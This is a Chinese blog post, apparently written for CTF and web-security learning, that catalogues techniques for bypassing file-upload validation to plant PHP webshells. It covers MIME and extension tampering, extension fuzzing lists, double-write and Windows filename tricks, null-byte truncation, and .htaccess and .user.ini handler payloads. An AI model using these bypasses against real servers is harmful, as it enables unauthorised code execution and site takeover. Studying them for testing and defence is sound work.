@@ -1,0 +1,394 @@
+
+<!DOCTYPE html>
+<html lang="zn-ch" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>文件上传利用绕过方式总结 - 和音说</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="和音说,"> 
+    <meta name="description" content="流离之人追逐幻影,
+
+
+前端验证1.1 修改前端 javascript 文件将限制代码去掉1.2 传参过程中抓包修改后缀1.3 前端禁用 javascript 脚本
+后端验证2.1 基于 MIME 校验2.1.1 校,"> 
+    <meta name="author" content="和音"> 
+    <link rel="alternative" href="atom.xml" title="和音说" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="文件上传利用绕过方式总结 - 和音说"/>
+    <meta name="twitter:description" content="流离之人追逐幻影,
+
+
+前端验证1.1 修改前端 javascript 文件将限制代码去掉1.2 传参过程中抓包修改后缀1.3 前端禁用 javascript 脚本
+后端验证2.1 基于 MIME 校验2.1.1 校,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="和音说"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="文件上传利用绕过方式总结 - 和音说"/>
+    <meta property="og:description" content="流离之人追逐幻影,
+
+
+前端验证1.1 修改前端 javascript 文件将限制代码去掉1.2 传参过程中抓包修改后缀1.3 前端禁用 javascript 脚本
+后端验证2.1 基于 MIME 校验2.1.1 校,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">和音说</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://glan.site"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">文件上传利用绕过方式总结</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">文件上传利用绕过方式总结</h1>
+        <div class="stuff">
+            <span>八月 04, 2020</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/1582510679-150193-upload1.png" alt="img"></p>
+<hr>
+<ol>
+<li><strong>前端验证</strong><br>1.1 修改前端 javascript 文件将限制代码去掉<br>1.2 传参过程中抓包修改后缀<br>1.3 前端禁用 javascript 脚本</li>
+<li><strong>后端验证</strong><br>2.1 <strong>基于 MIME 校验</strong><br>2.1.1 校验 content-type 请求头<br>2.1.2 修改文件后缀<br>2.2 <strong>基于后缀绕过</strong><br>2.2.1 <strong>黑名单验证绕过</strong><br>2.2.1.1 <strong>针对 windows 系统绕过</strong><br>2.2.1.1.1 使用其他可执行并且未限制的后缀名<br>2.2.1.1.2 大小写混合绕过<br>2.2.1.1.3 文件名双写绕过<br>2.2.1.1.4 末尾添加 . 绕过<br>2.2.1.1.5 末尾添加空格绕过<br>2.2.1.1.6 末尾添加 ::$DATA 绕过<br>2.2.1.1.7 00截断上传<br>2.2.1.1.8 上传 .access 文件<br>2.2.1.1.9 条件竞争绕过<br>2.2.1.1.10 上传图片马配合文件解析漏洞绕过<br>2.2.1.2 <strong>针对 linux 系统绕过</strong><br>2.2.1.2.1 使用其他可执行并且未限制的后缀名<br>2.2.1.2.2 文件名双写绕过<br>2.2.1.2.3 00截断上传绕过<br>2.2.1.2.4 上传 .access 文件<br>2.2.1.2.5 条件竞争绕过<br>2.2.1.2.6 上传图片马配合文件解析漏洞绕过<br>2.2.2 <strong>白名单验证绕过</strong><br>2.2.2.1 上传图片马配合文件解析漏洞绕过<br>2.2.2.2 上传 .access 文件绕过<br>2.3 <strong>基于文件内容验证</strong><br>2.3.1 上传图片马配合文件解析漏洞绕过</li>
+</ol>
+<hr>
+<h2 id="1-前端验证"><a href="#1-前端验证" class="headerlink" title="1. 前端验证"></a>1. 前端验证</h2><p>前端验证的概念是与后端验证所区分而来，所谓前端文件验证，即是在文件正式开始上传之前，例如利用 javascript 脚本，对文件进行白名单或黑名单过滤，符合规则即可以向服务器上传，不符合则拒绝上传。</p>
+<p>常规的 javascript 限制上传文件后缀代码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;JavaScript&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> aa = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;userfile&quot;</span>).<span class="property">value</span>.<span class="title function_">toLowerCase</span>().<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">document</span>.<span class="property">form1</span>.<span class="property">userfile</span>.<span class="property">value</span> == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&#x27;图片不能为空！&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(aa[aa.<span class="property">length</span> - <span class="number">1</span>] == <span class="string">&#x27;gif&#x27;</span> || aa[aa.<span class="property">length</span> - <span class="number">1</span>] == <span class="string">&#x27;jpg&#x27;</span> || aa[aa.<span class="property">length</span> - <span class="number">1</span>] == <span class="string">&#x27;bmp&#x27;</span> || aa[aa.<span class="property">length</span> - <span class="number">1</span>] == <span class="string">&#x27;png&#x27;</span> || aa[aa.<span class="property">length</span> - <span class="number">1</span>] == <span class="string">&#x27;jpeg&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">var</span> imagSize = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;userfile&quot;</span>).<span class="property">files</span>[<span class="number">0</span>].<span class="property">size</span>;</span><br><span class="line">                <span class="title function_">alert</span>(<span class="string">&quot;图片大小：&quot;</span> + imagSize + <span class="string">&quot;B&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span>(imagSize &lt; <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">3</span>)</span><br><span class="line">                    <span class="title function_">alert</span>(<span class="string">&quot;图片大小在3M以内，为：&quot;</span> + imagSize / (<span class="number">1024</span> * <span class="number">1024</span>) + <span class="string">&quot;M&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_">alert</span>(<span class="string">&#x27;请选择格式为*.jpg、*.gif、*.bmp、*.png、*.jpeg 的图片&#x27;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-1-修改前端-javascript-文件将限制代码去掉"><a href="#1-1-修改前端-javascript-文件将限制代码去掉" class="headerlink" title="1.1 修改前端 javascript 文件将限制代码去掉"></a>1.1 修改前端 javascript 文件将限制代码去掉</h2><p>虽然使用 javascript 脚本对上传的文件进行里过滤，但是由于 javascript 代码放在前端，这就意味着 javascript 可以在客户端直接被修改，所以我们可以在浏览器直接按“F12”查看页面代码并进行编辑，那么就可以把限制代码改掉。</p>
+<h2 id="1-2-传参过程中抓包修改后缀"><a href="#1-2-传参过程中抓包修改后缀" class="headerlink" title="1.2 传参过程中抓包修改后缀"></a>1.2 传参过程中抓包修改后缀</h2><p>可以不修改 javascript 代码，例如制作一个简单的 php webshell ，再将 webshell 的后缀改成符合 javascript 的 png 后缀，上传文件，再使用 burpsuite 抓取数据包（此时文件已经通过了前端 javascript 校验，正准备上传到服务器），将文件后缀再改成 php 文件，此时上传的即时 php 的 webshell ，并且成功绕过前端 javascript 验证。</p>
+<blockquote>
+<p><strong>Webshell</strong><br>webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。<br>顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。<br>——————By <a target="_blank" rel="noopener" href="https://baike.baidu.com/item/WEBSHELL">百度百科</a></p>
+</blockquote>
+<p><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/1582511932-510797-upload1-0-20200726140013458.png" alt="img"></p>
+<h2 id="1-3-前端禁用-javascript-脚本"><a href="#1-3-前端禁用-javascript-脚本" class="headerlink" title="1.3 前端禁用 javascript 脚本"></a>1.3 前端禁用 javascript 脚本</h2><p>既然是前端 javascript 验证，我们又能修改 javascript 脚本，如果不会修改，那就可以直接把 javascript 全部删掉，这样既没有了 javascript 限制，也不影响上传代码成功执行，即可达到目的。</p>
+<h2 id="2-后端验证"><a href="#2-后端验证" class="headerlink" title="2. 后端验证"></a>2. 后端验证</h2><p>后端即是服务器，当文件上传到服务器之后，再进行校验匹配文件是否符合规则，符合则保留，不符合就删除。</p>
+<h2 id="2-1-基于-MIME-校验"><a href="#2-1-基于-MIME-校验" class="headerlink" title="2.1 基于 MIME 校验"></a>2.1 基于 MIME 校验</h2><p><strong>什么是MIME？</strong></p>
+<blockquote>
+<p><strong>MIME &amp;&amp; MIME 邮件</strong></p>
+<p>MIME, 全称为“Multipurpose Internet Mail Extensions”, 比较确切的中文名称为“多用途互联网邮件扩展”。它是当前广泛应用的一种电子邮件技术规范，基本内容定义于RFC 2045-2049。</p>
+<p>自然，MIME邮件就是符合MIME规范的电子邮件，或者说根据MIME规范编码而成的电子邮件。</p>
+<p>在MIME出台之前，使用RFC 822只能发送基本的ASCII码文本信息，邮件内容如果要包括二进制文件、声音和动画等，实现起来非常困难。MIME提供了一种可以在邮件中附加多种不同编码文件的方法，弥补了原来的信息格式的不足。实际上不仅仅是邮件编码，现在MIME经成为HTTP协议标准的一个部分。<br>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。</p>
+</blockquote>
+<p><strong>MIME 类型简介：</strong><br>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。<br>官方的 MIME 信息是由 Internet Engineering Task Force (IETF) 在下面的文档中提供的：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://www.rfc-editor.org/rfc/rfc822.txt">RFC-822</a> Standard for ARPA Internet text messages</li>
+<li><a target="_blank" rel="noopener" href="http://www.rfc-editor.org/rfc/rfc2045.txt">RFC-2045</a> MIME Part 1: Format of Internet Message Bodies</li>
+<li><a target="_blank" rel="noopener" href="http://www.rfc-editor.org/rfc/rfc2046.txt">RFC-2046</a> MIME Part 2: Media Types</li>
+<li><a target="_blank" rel="noopener" href="http://www.rfc-editor.org/rfc/rfc2047.txt">RFC-2047</a> MIME Part 3: Header Extensions for Non-ASCII Text</li>
+<li><a target="_blank" rel="noopener" href="http://www.rfc-editor.org/rfc/rfc2048.txt">RFC-2048</a> MIME Part 4: Registration Procedures</li>
+<li><a target="_blank" rel="noopener" href="http://www.rfc-editor.org/rfc/rfc2049.txt">RFC-2049</a> MIME Part 5: Conformance Criteria and Examples</li>
+</ul>
+<p><strong>常见的 MIME 类型：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">超文本标记语言文本 .html text/html</span><br><span class="line">xml文档 .xml text/xml</span><br><span class="line">XHTML文档 .xhtml application/xhtml+xml</span><br><span class="line">普通文本 .txt text/plain</span><br><span class="line">RTF文本 .rtf application/rtf</span><br><span class="line">PDF文档 .pdf application/pdf</span><br><span class="line">Microsoft Word文件 .word application/msword</span><br><span class="line">PNG图像 .png image/png</span><br><span class="line">GIF图形 .gif image/gif</span><br><span class="line">JPEG图形 .jpeg,.jpg image/jpeg</span><br><span class="line">au声音文件 .au audio/basic</span><br><span class="line">MIDI音乐文件 mid,.midi audio/midi,audio/x-midi</span><br><span class="line">RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio</span><br><span class="line">MPEG文件 .mpg,.mpeg video/mpeg</span><br><span class="line">AVI文件 .avi video/x-msvideo</span><br><span class="line">GZIP文件 .gz application/x-gzip</span><br><span class="line">TAR文件 .tar application/x-tar</span><br></pre></td></tr></table></figure>
+
+<p>完整的 MIME 格式类型参考：<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/media/media_mimeref.asp">https://www.w3school.com.cn/media/media_mimeref.asp</a></p>
+<h2 id="2-1-1-校验-content-type-请求头"><a href="#2-1-1-校验-content-type-请求头" class="headerlink" title="2.1.1 校验 content-type 请求头"></a>2.1.1 校验 content-type 请求头</h2><p>当文件上传时利用 MIME 类型匹配文件类型时候符合要求，符合则通过不符合再拒绝。以下是基于 content-type 请求头限制的一部分 php 代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] != <span class="string">&quot;image/gif&quot;</span>)  <span class="comment">#这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, we only allow uploading GIF images&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$uploaddir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line"><span class="variable">$uploadfile</span> = <span class="variable">$uploaddir</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$uploadfile</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;File is valid, and was successfully uploaded.\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;File uploading failed.\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>像这样的只允许上传 image&#x2F;gif 格式文件，也就是 gif 格式文件，可以在上传文件是抓包并修改该 MIME 文件类型即可上传成功。</p>
+<h2 id="2-1-2-修改文件后缀"><a href="#2-1-2-修改文件后缀" class="headerlink" title="2.1.2 修改文件后缀"></a>2.1.2 修改文件后缀</h2><p>原理与上述一样，不过抓包中修改的位置不同，此处直接抓包修改文件后缀名即可。</p>
+<h2 id="2-2-基于后缀绕过"><a href="#2-2-基于后缀绕过" class="headerlink" title="2.2 基于后缀绕过"></a>2.2 基于后缀绕过</h2><p>最容易理解的一种绕过方式，只要可以突破上传点没有限制到的后缀名即可上传成功。<br>举例几种常见的后缀名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;</span><br></pre></td></tr></table></figure>
+
+<p>在测试上传点时，只要上传点忽略了其中一点，我们就可以上传马儿</p>
+<p>至于如何知晓哪些后缀没有被限制，可以使用 burpsuite 批量上传来测试后缀名</p>
+<p>首先随意抓取一个 request 请求包发送给 intrude：<br><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/1582609077-866053-upload-labs6-3.png" alt="img"><br>接着添加以下 payload 并开始攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">php</span><br><span class="line">php7</span><br><span class="line">php5</span><br><span class="line">php4</span><br><span class="line">php3</span><br><span class="line">php2</span><br><span class="line">php1</span><br><span class="line">html</span><br><span class="line">htm</span><br><span class="line">phtml</span><br><span class="line">pHp</span><br><span class="line">Php</span><br><span class="line">phP</span><br><span class="line">pHp5</span><br><span class="line">pHp4</span><br><span class="line">pHp3</span><br><span class="line">pHp2</span><br><span class="line">pHp1</span><br></pre></td></tr></table></figure>
+
+<p>可以看到除了 response 长度为 5299 的包之外的其他包全部上传成功，知道里那些后缀可以上传之后我们在构造我的的马儿<br><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/1582609253-89688-upload-labs6-4.png" alt="img"></p>
+<p>以此来判断哪些后缀可以上传，然后再去构造马儿即可。</p>
+<h2 id="2-2-1-黑名单验证绕过"><a href="#2-2-1-黑名单验证绕过" class="headerlink" title="2.2.1 黑名单验证绕过"></a>2.2.1 黑名单验证绕过</h2><blockquote>
+<p><strong>黑名单 &amp; 白名单</strong><br>这里的黑名单白名单指在上传点的限制方式，黑名单例如仅拒绝 xxx 格式上传，只要上传的内容不是 xxx 格式，文件均可以上传到服务器，对应的白名单即为仅允许上传 yyy 格式，只要不是 yyy 格式的文件全部拒绝上传。</p>
+</blockquote>
+<h2 id="2-2-1-1-针对-windows-系统绕过"><a href="#2-2-1-1-针对-windows-系统绕过" class="headerlink" title="2.2.1.1 针对 windows 系统绕过"></a>2.2.1.1 针对 windows 系统绕过</h2><p>上传点的服务器可能是 windows 或者 linux 系统，但是针对不同的操作系统有着不同的可绕过方式，我们先来看针对 windows 服务器的可绕过方式。</p>
+<h2 id="2-2-1-1-1-使用其他可执行并且未限制的后缀名"><a href="#2-2-1-1-1-使用其他可执行并且未限制的后缀名" class="headerlink" title="2.2.1.1.1 使用其他可执行并且未限制的后缀名"></a>2.2.1.1.1 使用其他可执行并且未限制的后缀名</h2><p>该上传思路即为“没限制什么后缀就上传什么后缀”，可以使用之前的 burpsuite 测试后缀的方式测试可以上传哪些后缀，再构造相应马儿即可。</p>
+<h2 id="2-2-1-1-2-大小写混合绕过"><a href="#2-2-1-1-2-大小写混合绕过" class="headerlink" title="2.2.1.1.2 大小写混合绕过"></a>2.2.1.1.2 大小写混合绕过</h2><p>windows 系统中的特性，文件的文件名大小写组合也可以运行，是不区分大小写的，所以在一些上传点中，例如黑名单禁止 x.php 上传，就可以构造 x.Php 等文件，上传到服务器之后 x.Php 在 windows 系统中仍然会以 php 文件来处理执行。</p>
+<h2 id="2-2-1-1-3-文件名双写绕过"><a href="#2-2-1-1-3-文件名双写绕过" class="headerlink" title="2.2.1.1.3 文件名双写绕过"></a>2.2.1.1.3 文件名双写绕过</h2><p>例如这样的限制代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure>
+
+<p>直接使用双写绕过就行 x.pphphp ，最后生成 x.php 文件</p>
+<h2 id="2-2-1-1-4-末尾添加-绕过"><a href="#2-2-1-1-4-末尾添加-绕过" class="headerlink" title="2.2.1.1.4 末尾添加 . 绕过"></a>2.2.1.1.4 末尾添加 . 绕过</h2><p>在某些环境中可以使用 x.php. 文件绕过上传，文件上传到 windows 服务器后，会根据 windows 特有的机制在保存文件是将文件结尾的 . 去掉，这样既绕过里上传限制，也保存下来里 x.php 文件（结尾加 . 可以与双写或大小写混用，但是仅限 windows 系统）</p>
+<h2 id="2-2-1-1-5-末尾添加空格绕过"><a href="#2-2-1-1-5-末尾添加空格绕过" class="headerlink" title="2.2.1.1.5 末尾添加空格绕过"></a>2.2.1.1.5 末尾添加空格绕过</h2><p>上传文件是使用 burpsuite 抓包在结尾处添加空格即可，windows 会在保存文件时将空格去掉。<br><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/1582610313-719923-upload-labs7-2-20200726140000055.png" alt="img"></p>
+<h2 id="2-2-1-1-6-末尾添加-DATA-绕过"><a href="#2-2-1-1-6-末尾添加-DATA-绕过" class="headerlink" title="2.2.1.1.6 末尾添加 ::$DATA 绕过"></a>2.2.1.1.6 末尾添加 ::$DATA 绕过</h2><blockquote>
+<p><strong>Windows ::$DATA alternate data stream</strong><br>The NTFS file system includes support for alternate data streams. This is not a well known feature and was included, primarily, to provide compatibility with files in the Macintosh file system. Alternate data streams allow files to contain more than one stream of data. Every file has at least one data stream. In Windows, this default data stream is called ::$DATA.</p>
+</blockquote>
+<p>总结来看 ::$DATA 是 windows 的 NTFS 文件系统中的一种机制，当文件名结尾为 ::$DATA 则触发，但是最终保存下来的文件名是不带 ::$DATA 的，从而绕过黑名单限制上传。</p>
+<blockquote>
+<p><strong>NTFS</strong><br>NTFS（英語：New Technology File System），是Microsoft公司开发的专用文件系统，从Windows NT 3.1开始成为Windows NT家族的标准文件系统。</p>
+<p>NTFS取代FAT（文件分配表）和HPFS（高性能文件系统）并进行一系列改进，例如增强对元数据的支持，使用更高级的数据结构以提升性能、可靠性和磁盘空间利用率，并附带一系列增强功能，如访问控制列表（ACL）和文件系统日志。</p>
+</blockquote>
+<p><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/1582686434-63469-upload-labs9-2-20200726135957724.png" alt="img"></p>
+<h2 id="2-2-1-1-7-00截断上传"><a href="#2-2-1-1-7-00截断上传" class="headerlink" title="2.2.1.1.7 00截断上传"></a>2.2.1.1.7 00截断上传</h2><blockquote>
+<p><strong>00截断</strong><br>无论0x00还是%00，最终被解析后都是一个东西:chr（0）<br>chr()是一个函数，这个函数是用来返回参数所对应的字符的，也就是说，参数是一个ASCII码，返回的值是一个字符，类型为string。</p>
+<p>那么chr(0)就很好理解了，对照ASCII码表可以知道，ASCII码为0-127的数字，每个数字对应一个字符，而0对应的就是NUT字符（NULL），也就是空字符，而截断的关键就是这个空字符，当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃。<br>这种情况常出现在ASP程序中，PHP 版本&lt;5.3.4时也会有这个情况，JSP中也会出现。<br>那么就可以知道00截断的原理了，在后缀中插入一个空字符（不是空格），会导致之后的部分被丢弃，而导致绕过的发生。如：在文件1.php.jpg中插入空字符变成：1.php.0x00.jpg中，解析后就会只剩下1.php，而空字符怎么插入的呢？通常我们会用Burp抓包后，在文件名插入一个空格，然后再HEX中找到空格对应的16进制编码“20”，把它改成00（即16进制ASCII码00，对应十进制的0），就可以插入空字符了。PS:这里的空格纯粹只是一个标记符号，便于我们找到位置，其实这里是什么字符都无所谓，只不过空格比较有特异性，方便在HEX中查找位置。</p>
+</blockquote>
+<p>00截断在 php 环境中需要满足以下要求，二者缺一不可。</p>
+<ul>
+<li>php 版本小于 5.3.4</li>
+<li>php的magic_quotes_gpc为OFF状态</li>
+</ul>
+<h2 id="2-2-1-1-8-上传-access-文件"><a href="#2-2-1-1-8-上传-access-文件" class="headerlink" title="2.2.1.1.8 上传 .access 文件"></a>2.2.1.1.8 上传 .access 文件</h2><p>这里的 .access 只是一个泛例，具体包括 .htaccess 和 .user.ini 等可造成解析漏洞的文件。</p>
+<blockquote>
+<p><strong>.htaccess</strong><br>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p>
+</blockquote>
+<p>可以编辑一个 .htaccess 文件写入以下内容上传至服务器：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">SetHandler</span> application/x-httpd-php</span><br></pre></td></tr></table></figure>
+
+<p>上传该文件后再上传图片马或其他文件，只要该文件有可执行的 php 代码，就可以执行 php 代码。</p>
+<blockquote>
+<p><strong>.user.ini</strong> ：<br>自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用 .htaccess 文件有同样效果。</p>
+<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
+<p>在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p>
+<p>两个新的 INI 指令，user_ini.filename 和 user_ini.cache_ttl 控制着用户 INI 文件的使用。</p>
+<p>user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 .user.ini。</p>
+<p>user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p>
+</blockquote>
+<p>但是想要引发 .user.ini 解析漏洞需要三个前提条件</p>
+<ul>
+<li>服务器脚本语言为PHP</li>
+<li>服务器使用CGI／FastCGI模式</li>
+<li>上传目录下要有可执行的php文件</li>
+</ul>
+<p>先来创建一个 .user.ini 文件并写入一下内容：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=x.png</span><br></pre></td></tr></table></figure>
+
+<p>上传 .user.ini 后，再上传一个 x.png 文件，此时 x.png 文件只要有符合 php 语言的代码就会执行。</p>
